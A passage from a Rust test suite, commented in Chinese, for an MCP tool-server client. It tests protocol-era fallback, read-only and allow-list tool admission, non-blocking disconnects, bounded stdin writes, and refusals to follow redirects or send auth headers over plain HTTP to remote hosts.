            ("*'\"method\":\"initialize\"'*", "\"result\":{\"protocolVersion\":\"2025-06-18\",\"serverInfo\":{\"name\":\"legacy-stdio\"}}"),
            ("*'\"method\":\"tools/list\"'*", "\"result\":{\"tools\":[{\"name\":\"get_time\",\"inputSchema\":{\"type\":\"object\"},\"annotations\":{\"readOnlyHint\":true}}]}"),
            ("*'\"method\":\"tools/call\"'*", "\"result\":{\"content\":[{\"type\":\"text\",\"text\":\"legacy-stdio 12:00\"}],\"isError\":false}"),
        ]);
        state
            .upsert(stdio_spec("ls", "/bin/sh", vec!["-c".into(), legacy], 3000))
            .unwrap();
        let out2 = state.connect("ls").expect("旧 stdio 应回退连上");
        assert_eq!(out2["era"], "legacy");
        assert_eq!(out2["protocolVersion"], "2025-06-18");
        assert_eq!(
            state.call("ls", "get_time", json!({})).unwrap()["content"][0]["text"],
            "legacy-stdio 12:00"
        );
        assert!(state.disconnect("ls"));

        let mute = stdio_script(&[
            ("*'\"method\":\"server/discover\"'*", ":"),
            ("*'\"method\":\"initialize\"'*", "\"result\":{\"protocolVersion\":\"2025-06-18\",\"serverInfo\":{\"name\":\"mute-discover\"}}"),
            ("*'\"method\":\"tools/list\"'*", "\"result\":{\"tools\":[]}"),
        ]);
        state
            .upsert(stdio_spec("md", "/bin/sh", vec!["-c".into(), mute], 1000))
            .unwrap();
        let t0 = Instant::now();
        let out3 = state.connect("md").expect("装死探测应回退旧纪元连上");
        let cost = t0.elapsed();
        assert_eq!(out3["era"], "legacy");
        assert_eq!(out3["serverInfo"]["name"], "mute-discover");
        assert!(
            cost >= Duration::from_millis(800) && cost < Duration::from_millis(2500),
            "探测预算 = min(超时, 3 s) = 1 s,实耗 {cost:?}"
        );
        assert!(state.disconnect("md"));
    }

    /// 🟢 现代服务器在 tools/list 回 resultType input_required(MRTR 反问):本客户端不做交互式结果 ⇒ 连接失败、错误点名。
    #[test]
    fn modern_input_required_result_is_rejected() {
        let _guard = env_guard();
        let (url, h) = era_http_server("input_required");
        let state = test_state();
        state.upsert(http_spec("ir", &url, 3000)).unwrap();
        let err = state.connect("ir").expect_err("input_required 必须拒收");
        assert!(err.to_string().contains("input_required"), "{err}");
        assert_eq!(state.list()[0]["connected"], false);
        let _ = h.join();
    }

    /// 🟢 壳侧准入镜像页面规则:未宣告 ⇒ not listed;既非 readOnlyHint 又不在允许清单 ⇒ not admitted;
    /// 只读档下允许清单不放行写工具;按清单档列入允许清单后放行。
    #[test]
    fn call_admission_mirrors_page_rule() {
        let _guard = env_guard();
        let script = stdio_script(&[
            ("*'\"method\":\"server/discover\"'*", "\"error\":{\"code\":-32601,\"message\":\"Method not found\"}"),
            ("*'\"method\":\"initialize\"'*", "\"result\":{\"protocolVersion\":\"2025-06-18\",\"serverInfo\":{\"name\":\"adm\"}}"),
            ("*'\"method\":\"tools/list\"'*", "\"result\":{\"tools\":[{\"name\":\"get_time\",\"inputSchema\":{\"type\":\"object\"},\"annotations\":{\"readOnlyHint\":true}},{\"name\":\"write_note\",\"inputSchema\":{\"type\":\"object\"}}]}"),
            ("*'\"method\":\"tools/call\"'*", "\"result\":{\"content\":[{\"type\":\"text\",\"text\":\"ok\"}],\"isError\":false}"),
        ]);
        let state = test_state();
        let mut spec = stdio_spec("adm", "/bin/sh", vec!["-c".into(), script], 3000);
        state.upsert(spec.clone()).unwrap();
        state.connect("adm").expect("用户在面板点连接(确认过指纹)");
        assert_eq!(
            state.call("adm", "get_time", json!({})).unwrap()["content"][0]["text"],
            "ok",
            "readOnlyHint 工具放行"
        );
        let e1 = state
            .call("adm", "write_note", json!({}))
            .expect_err("非只读且不在清单 ⇒ 拒");
        assert!(e1.to_string().contains("not admitted"), "{e1}");
        let e2 = state
            .call("adm", "nope", json!({}))
            .expect_err("服务器未宣告 ⇒ 拒");
        assert!(e2.to_string().contains("not listed"), "{e2}");
        // 只读档 + 清单列了写工具:仍拒(清单不放行写工具)
        spec.allow_tools = vec!["write_note".into()];
        state.upsert(spec.clone()).unwrap();
        assert!(state
            .call("adm", "write_note", json!({}))
            .expect_err("只读档清单不放行写工具")
            .to_string()
            .contains("read-only mode ignores the allow list"));
        // 放开只读限制但没列清单:仍拒(与页面同);列入清单后放行;清单里列了未宣告的名字仍拒
        spec.read_only_only = false;
        spec.allow_tools = vec![];
        state.upsert(spec.clone()).unwrap();
        assert!(state
            .call("adm", "write_note", json!({}))
            .expect_err("未列清单仍拒")
            .to_string()
            .contains("not admitted"));
        spec.allow_tools = vec!["write_note".into(), "ghost".into()];
        state.upsert(spec).unwrap();
        assert_eq!(
            state.call("adm", "write_note", json!({})).unwrap()["content"][0]["text"],
            "ok",
            "允许清单放行"
        );
        assert!(state
            .call("adm", "ghost", json!({}))
            .expect_err("清单里的幽灵名仍须服务器宣告")
            .to_string()
            .contains("not listed"));
        // 纯函数向量
        let tools = vec![
            json!({ "name": "ro", "annotations": { "readOnlyHint": true } }),
            json!({ "name": "rw" }),
        ];
        let base = stdio_spec("x", "/bin/true", vec![], 0);
        assert!(admit_tool(&base, &tools, "ro").is_ok());
        assert!(admit_tool(&base, &tools, "rw").is_err());
        assert!(admit_tool(&base, &tools, "zz").is_err());
        let mut listed = base.clone();
        listed.allow_tools = vec!["rw".into()];
        // 只读档:清单不放行写工具;按清单档:清单放行
        assert!(admit_tool(&listed, &tools, "rw").is_err());
        listed.read_only_only = false;
        assert!(admit_tool(&listed, &tools, "rw").is_ok());
        assert!(admit_tool(&listed, &tools, "ro").is_ok());
        assert!(state.disconnect("adm"));
    }

    // ───────────────────── 断开不等在途调用 / stdin 写有截止 / 不跟随重定向 ─────────────────────

    fn mute_call_script() -> String {
        stdio_script(&[
            ("*'\"method\":\"server/discover\"'*", "\"error\":{\"code\":-32601,\"message\":\"Method not found\"}"),
            ("*'\"method\":\"initialize\"'*", "\"result\":{\"protocolVersion\":\"2025-06-18\",\"serverInfo\":{\"name\":\"mute\"}}"),
            ("*'\"method\":\"tools/list\"'*", "\"result\":{\"tools\":[{\"name\":\"get_time\",\"inputSchema\":{\"type\":\"object\"},\"annotations\":{\"readOnlyHint\":true}}]}"),
            ("*'\"method\":\"tools/call\"'*", ":"),
        ])
    }

    fn with_header(mut spec: ServerSpec, k: &str, v: &str) -> ServerSpec {
        if let Transport::Http { headers, .. } = &mut spec.transport {
            headers.insert(k.into(), v.into());
        }
        spec
    }

    /// 🔴 旧实现 `call` 在整个往返期间攥着连接锁,`disconnect` 先摘表再阻塞等这把锁 —— 在途调用最长 120 s,
    /// 断开 / 删除(主线程命令)与退出臂就跟着卡住界面。现在断开先杀进程、不碰连接锁:立刻返回,在途调用随即报错返回。
    /// 🔴 在途 connect 握手期间:改了命令 / 用户点断开 ⇒ 这条连接作废(回错误、连接表里没有、按旧命令起的进程被收掉);
    /// 不受干扰时照常连上;两路同时首连同一服务器(AI 并行调用自动连)不互相判废
    #[test]
    fn inflight_connect_is_voided_when_spec_changes_or_user_disconnects() {
        let _guard = env_guard();
        let base = stdio_script(&[
            ("*'\"method\":\"server/discover\"'*", "\"error\":{\"code\":-32601,\"message\":\"Method not found\"}"),
            ("*'\"method\":\"initialize\"'*", "\"result\":{\"protocolVersion\":\"2025-06-18\",\"serverInfo\":{\"name\":\"slow\"}}"),
            ("*'\"method\":\"tools/list\"'*", "\"result\":{\"tools\":[]}"),
        ]);
        let slow_arm = "*'\"method\":\"tools/list\"'*) echo";
        assert!(base.contains(slow_arm), "脚本形状变了:{base}");
        let script = base.replace(slow_arm, "*'\"method\":\"tools/list\"'*) sleep 1; echo");
        let state = Arc::new(test_state());
        state
            .upsert(stdio_spec(
                "slow",
                "/bin/sh",
                vec!["-c".into(), script.clone()],
                5000,
            ))
            .unwrap();
        let in_table = |st: &ClientState| st.conns.lock().unwrap().contains_key("slow");
        // ① 握手中改了命令
        let s2 = Arc::clone(&state);
        let h = thread::spawn(move || s2.connect("slow"));
        thread::sleep(Duration::from_millis(400));
        let out = state
            .upsert(stdio_spec(
                "slow",
                "/bin/sh",
                vec!["-c".into(), format!("{script}\n# v2")],
                5000,
            ))
            .unwrap();
        assert_eq!(out["transportChanged"], true);
        let r = h.join().unwrap();
        assert!(
            r.is_err(),
            "握手期间改了命令,旧命令的连接不该落进连接表:{:?}",
            r
        );
        assert!(!in_table(&state), "旧命令的连接进了连接表");
        // ② 握手中用户点断开
        let s3 = Arc::clone(&state);
        let h = thread::spawn(move || s3.connect("slow"));
        thread::sleep(Duration::from_millis(400));
        assert!(!state.disconnect("slow"), "握手中表里本来就没有这条");
        assert!(
            h.join().unwrap().is_err(),
            "用户断开了,握手完成后不该再连上"
        );
        assert!(!in_table(&state));
        // ③ 判别力:不受干扰照常连上
        assert!(state.connect("slow").is_ok());
        assert!(in_table(&state));
        // ④ 两路同时首连不互相判废
        state.disconnect("slow");
        let (a, b) = (Arc::clone(&state), Arc::clone(&state));
        let ha = thread::spawn(move || a.connect_inner("slow", false));
        let hb = thread::spawn(move || b.connect_inner("slow", false));
        assert!(
            ha.join().unwrap().is_ok() && hb.join().unwrap().is_ok(),
            "两路同时首连不该互相判废"
        );
        assert!(in_table(&state));
        state.disconnect("slow");
    }

    #[test]
    fn disconnect_does_not_wait_for_an_inflight_call() {
        let _guard = env_guard();
        let state = Arc::new(test_state());
        state
            .upsert(stdio_spec(
                "busy",
                "/bin/sh",
                vec!["-c".into(), mute_call_script()],
                20_000,
            ))
            .expect("登记服务器");
        state.connect("busy").expect("应能连上");
        let s2 = Arc::clone(&state);
        let call = thread::spawn(move || {
            let t = Instant::now();
            let r = s2.call("busy", "get_time", json!({}));
            (r, t.elapsed())
        });
        thread::sleep(Duration::from_millis(300));
        let t0 = Instant::now();
        assert!(state.disconnect("busy"));
        let cost = t0.elapsed();
        assert!(
            cost < Duration::from_millis(500),
            "断开不得等在途调用放锁,实耗 {:?}",
            cost
        );
        let (r, took) = call.join().unwrap();
        assert!(r.is_err(), "进程被杀后在途调用必须报错返回");
        assert!(
            took < Duration::from_secs(5),
            "在途调用应随进程退出即返回(不等 20 s 超时),实耗 {:?}",
            took
        );
        assert_eq!(state.list()[0]["connected"], false);
    }

    /// 退出臂:摘表即返回(杀进程与回收在后台线程),子进程随后确实被杀掉、回收。
    #[test]
    fn stop_on_exit_returns_at_once_and_still_kills_children() {
        let _guard = env_guard();
        let state = test_state();
        state
            .upsert(stdio_spec(
                "bye",
                "/bin/sh",
                vec!["-c".into(), mute_call_script()],
                5_000,
            ))
            .expect("登记服务器");
        state.connect("bye").expect("应能连上");
        let pid = state
            .conns
            .lock()
            .unwrap()
            .get("bye")
            .and_then(|e| e.child.as_ref().map(|c| c.lock().unwrap().id()))
            .expect("stdio 连接带子进程句柄");
        let t0 = Instant::now();
        stop_on_exit(&state);
        assert!(
            t0.elapsed() < Duration::from_millis(100),
            "退出臂不得在调用线程上等,实耗 {:?}",
            t0.elapsed()
        );
        assert_eq!(state.list()[0]["connected"], false);
        let deadline = Instant::now() + Duration::from_secs(3);
        while crate::mcp_stdio::pid_alive(pid) && Instant::now() < deadline {
            thread::sleep(Duration::from_millis(20));
        }
        assert!(!crate::mcp_stdio::pid_alive(pid), "子进程应被杀掉并回收");
    }

    /// 🔴 stdin 写入没有截止时间:对方不读 stdin(管道缓冲写满)时调用线程永久阻塞在写上。
    /// 现在写在专用线程里,调用方按同一超时预算等回执;写了半行的连接作废(子进程被杀)。
    #[test]
    fn stdin_write_is_bounded_by_the_call_timeout() {
        let _guard = env_guard();
        let mut conn = hung_child(800);
        let Conn::Stdio { child, stdin, rx } = &mut conn else {
            panic!("夹具必须是 stdio 连接")
        };
        let big = "x".repeat(4 << 20);
        let req =
            json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": { "blob": big } });
        let t0 = Instant::now();
        let err = stdio_rpc(stdin, rx, child, &req, 1, Duration::from_millis(800))
            .expect_err("写不进去必须按超时收口");
        assert!(err.to_string().contains("timeout writing"), "{}", err);
        assert!(
            t0.elapsed() < Duration::from_secs(3),
            "实耗 {:?}",
            t0.elapsed()
        );
        let deadline = Instant::now() + Duration::from_secs(3);
        while child_exited(child).is_none() && Instant::now() < deadline {
            thread::sleep(Duration::from_millis(20));
        }
        assert!(
            child_exited(child).is_some(),
            "写坏分帧的连接应作废(子进程被杀)"
        );
    }

    /// 🔴 reqwest 缺省跟随重定向:3xx 会把自定义头(常常就是令牌)原样带去别的主机。现在不跟随,3xx 按上游错误报出。
    #[test]
    fn http_redirect_is_not_followed_and_custom_headers_stay_home() {
        let _guard = env_guard();
        let b = tiny_http::Server::http("127.0.0.1:0").expect("bind");
        let b_port = b.server_addr().to_ip().map(|a| a.port()).unwrap_or(0);
        let hb = thread::spawn(move || {
            let mut leaked = 0usize;
            while let Ok(Some(req)) = b.recv_timeout(Duration::from_millis(1500)) {
                if req.headers().iter().any(|h| h.field.equiv("X-Api-Key")) {
                    leaked += 1;
                }
                let _ = req.respond(tiny_http::Response::from_string("{}"));
            }
            leaked
        });
        let a = tiny_http::Server::http("127.0.0.1:0").expect("bind");
        let a_port = a.server_addr().to_ip().map(|a| a.port()).unwrap_or(0);
        let ha = thread::spawn(move || {
            let mut n = 0usize;
            while let Ok(Some(req)) = a.recv_timeout(Duration::from_millis(1500)) {
                n += 1;
                let loc = format!("http://127.0.0.1:{}/mcp", b_port);
                let _ = req.respond(tiny_http::Response::empty(307).with_header(
                    tiny_http::Header::from_bytes(&b"Location"[..], loc.as_bytes()).unwrap(),
                ));
            }
            n
        });
        let state = test_state();
        state
            .upsert(with_header(
                http_spec("redir", &format!("http://127.0.0.1:{}/mcp", a_port), 2000),
                "X-Api-Key",
                "s3cret",
            ))
            .expect("登记服务器");
        let err = state.connect("redir").expect_err("3xx 不是成功回应");
        assert!(err.to_string().contains("307"), "{}", err);
        assert!(ha.join().unwrap() >= 1);
        assert_eq!(hb.join().unwrap(), 0, "自定义头不得被重定向带去别的主机");
    }

    /// 带自定义头的明文 http 只许发往本机回环;发往别的机器在任何网络往来之前就拒连(提示改用 https)。
    #[test]
    fn plain_http_to_a_remote_host_with_custom_headers_is_refused() {
        let _guard = env_guard();
        let state = test_state();
        state
            .upsert(with_header(
                http_spec("remote", "http://example.invalid/mcp", 2000),
                "Authorization",
                "Bearer s3cret",
            ))
            .expect("登记服务器");
        let t0 = Instant::now();
        let err = state.connect("remote").expect_err("必须拒连");
        assert!(err.to_string().contains("https://"), "{}", err);
        assert!(t0.elapsed() < Duration::from_millis(500));
        // https / 本机回环 / 不带头的明文都不在此拒(只建客户端,不发请求)
        for (url, header) in [
            ("https://example.invalid/mcp", true),
            ("http://127.0.0.1:9/mcp", true),
            ("http://localhost:9/mcp", true),
            ("http://[::1]:9/mcp", true),
            ("http://example.invalid/mcp", false),
        ] {
            let spec = http_spec("x", url, 2000);
            let spec = if header {
                with_header(spec, "Authorization", "Bearer s3cret")
            } else {
                spec
            };
            assert!(open_conn(&spec).is_ok(), "{} 不应被拒", url);
        }
    }
}
